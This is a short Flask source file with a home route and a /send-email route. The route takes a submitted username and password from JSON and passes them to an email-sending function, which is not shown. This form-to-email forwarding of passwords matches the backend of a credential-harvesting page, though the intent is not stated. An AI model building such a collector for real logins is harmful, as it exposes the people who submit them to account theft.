from flask import Flask, render_template, request, jsonify
from mailer import send_email

app = Flask(__name__)

@app.route("/")
def home():
    return render_template("index.html")


@app.route("/send-email", methods=["POST"])
def send():
    data = request.json

    username = data.get("username")
    password = data.get("password")

    try:
        send_email(username, password)
        return jsonify({"message": "Email sent!"})
    except Exception as e:
        print(e)
        return jsonify({"message": "Failed to send email"}), 500


# IMPORTANT: no app.run() needed for Render
